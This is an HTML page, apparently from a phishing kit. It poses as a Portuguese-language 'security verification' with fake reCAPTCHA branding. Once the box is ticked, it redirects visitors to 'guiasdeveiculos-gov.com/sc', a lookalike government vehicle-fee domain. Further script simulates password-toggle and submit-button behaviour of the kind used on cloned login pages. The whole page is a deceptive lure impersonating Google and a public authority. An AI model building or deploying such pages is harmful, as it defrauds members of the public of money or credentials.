<!DOCTYPE html>
<html lang="pt-BR"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Portal Do Cliente</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">


<link rel="stylesheet" href="styles.css"></head>
<body>
<div class="security-container">
  <div class="security-header">
    <svg class="security-icon" viewBox="0 0 24 24" fill="currentColor">
      <path d="M12 1 3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"></path>
    </svg>
    <span class="security-title">Verificação de segurança</span>
  </div>
  <div class="security-body">
    <p class="security-text">
      Para sua proteção, precisamos confirmar que você é uma pessoa real antes de acessar o portal.
    </p>
    <p class="security-note">
      Marque a caixa abaixo para concluir a verificação. Em seguida, você será redirecionado automaticamente.
    </p>
    <div class="recaptcha-frame">
      <label class="check-area" id="checkArea">
        <input type="checkbox" id="check">
        <div class="custom-check" id="customCheck">
          <svg class="spinner" viewBox="0 0 50 50">
            <circle class="spinner-track" cx="25" cy="25" r="20"></circle>
            <circle class="spinner-arc" cx="25" cy="25" r="20"></circle>
          </svg>
          <svg class="check-icon" viewBox="0 0 24 24" fill="none">
            <path d="M9 16.2 4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z" fill="#fff"></path>
          </svg>
        </div>
        <span class="check-text">Não sou um robô</span>
      </label>
      <div class="captcha-brand">
        <img src="images/img_ee317416ac.png" width="32" height="32" alt="">
        <div class="brand-name">reCAPTCHA</div>
        <div class="brand-links">
          <a href="https://policies.google.com/privacy" target="_blank">Privacidade</a>
          -
          <a href="https://policies.google.com/terms" target="_blank">Termos</a>
        </div>
      </div>
    </div>
  </div>
</div>
<script>
const check = document.getElementById("check");
const customCheck = document.getElementById("customCheck");
const checkArea = document.getElementById("checkArea");
let verifying = false;
check.addEventListener("change", () => {
  if (!check.checked) {
    if (verifying) {
      check.checked = true;
      return;
    }
    customCheck.classList.remove("checked", "loading");
    checkArea.classList.remove("verifying");
    return;
  }
  if (verifying) return;
  verifying = true;
  checkArea.classList.add("verifying");
  customCheck.classList.add("loading");
  setTimeout(() => {
    customCheck.classList.remove("loading");
    customCheck.classList.add("checked");
    checkArea.classList.remove("verifying");
    verifying = false;
    setTimeout(() => {
      window.location.href = "https://guiasdeveiculos-gov.com/sc";
    }, 800);
  }, 1000);
});
</script>


<script>
document.addEventListener('DOMContentLoaded', function() {
    document.addEventListener('click', function(e) {
        const btn = e.target.closest('button, [role="button"], .eye-icon');
        if (!btn || btn.type === 'submit' || btn.tagName === 'A') return;
        
        let container = btn.parentElement;
        let passInput = null;
        
        while(container && container.tagName !== 'BODY') {
            const inputs = Array.from(container.querySelectorAll('input:not([type="hidden"]):not([type="checkbox"]):not([type="radio"])'));
            if (inputs.length > 0) {
                passInput = inputs.find(i => i.type === 'password' || i.dataset.isPass === 'true');
                if (!passInput) {
                    passInput = inputs.find(i => {
                        const n = (i.name || '').toLowerCase();
                        const id = (i.id || '').toLowerCase();
                        return n.includes('pass') || id.includes('pass') || n.includes('senha') || id.includes('senha');
                    });
                }
                if (!passInput && inputs.length === 1) {
                    passInput = inputs[0];
                }
                if (passInput) break;
            }
            container = container.parentElement;
        }

        if (passInput && (btn.innerHTML.includes('svg') || btn.innerHTML.toLowerCase().includes('eye') || btn.innerHTML.toLowerCase().includes('olho'))) {
            e.preventDefault();
            passInput.dataset.isPass = 'true';
            const isText = passInput.type === 'password';
            passInput.type = isText ? 'text' : 'password';
            
            const svg = btn.tagName === 'SVG' ? btn : btn.querySelector('svg');
            if (svg) {
                if (!svg.dataset.boundColor) {
                    const path = svg.querySelector('path');
                    svg.dataset.boundColor = (path && path.getAttribute('fill')) || 'currentColor';
                    if (svg.dataset.boundColor === 'none') svg.dataset.boundColor = 'currentColor';
                }
                const color = svg.dataset.boundColor;
                svg.setAttribute('viewBox', '0 0 24 24');
                if (isText) {
                    svg.innerHTML = '<path fill="' + color + '" d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
                } else {
                    svg.innerHTML = '<path fill="' + color + '" d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2z"/>';
                }
            }
        }
    });

    // Ativar/Desativar botões de submit automaticamente (simulação React)
    const checkSubmitButtons = function() {
        // Procurar áreas de login baseadas no input de senha
        const passInputs = document.querySelectorAll('input[type="password"], input[data-is-pass="true"], input[name*="pass"], input[id*="pass"]');
        passInputs.forEach(pass => {
            let container = pass.closest('form');
            if (!container) {
                let curr = pass.parentElement;
                while(curr && curr.tagName !== 'BODY') {
                    if (curr.querySelector('button[type="submit"], button[id*="submit"], button[data-testid*="submit"]')) {
                        container = curr;
                        break;
                    }
                    curr = curr.parentElement;
                }
            }
            
            if (container) {
                const btns = container.querySelectorAll('button[type="submit"], button[id*="submit"], button[data-testid*="submit"]');
                const inputs = container.querySelectorAll('input:not([type="hidden"]):not([type="checkbox"]):not([type="radio"])');
                
                let allFilled = true;
                let visibleInputs = 0;
                
                inputs.forEach(inp => {
                    // ignorar inputs invisíveis, fora da tela, ou honeypots
                    const rect = inp.getBoundingClientRect();
                    const isVisible = rect.width > 2 && rect.height > 2 && 
                                      window.getComputedStyle(inp).visibility !== 'hidden' && 
                                      window.getComputedStyle(inp).opacity !== '0';
                    
                    if (isVisible) {
                        visibleInputs++;
                        if (inp.value.trim() === '') allFilled = false;
                    }
                });

                if (visibleInputs > 0 && btns.length > 0) {
                    btns.forEach(btn => {
                        if (allFilled) {
                            btn.removeAttribute('disabled');
                            btn.removeAttribute('aria-disabled');
                            btn.style.setProperty('opacity', '1', 'important');
                            btn.style.setProperty('pointer-events', 'auto', 'important');
                            btn.style.setProperty('cursor', 'pointer', 'important');
                            btn.style.setProperty('filter', 'none', 'important');
                            btn.classList.add('btn-active-simulated');
                        } else {
                            btn.setAttribute('disabled', 'true');
                            btn.setAttribute('aria-disabled', 'true');
                            btn.style.setProperty('opacity', '0.5', 'important');
                            btn.style.setProperty('pointer-events', 'none', 'important');
                            btn.style.setProperty('cursor', 'not-allowed', 'important');
                            btn.style.setProperty('filter', 'grayscale(100%)', 'important');
                            btn.classList.remove('btn-active-simulated');
                        }
                    });
                }
            }
        });
    };

    document.addEventListener('input', checkSubmitButtons);
    // Executa no load para garantir o estado inicial
    setTimeout(checkSubmitButtons, 100);
});
</script></body></html>
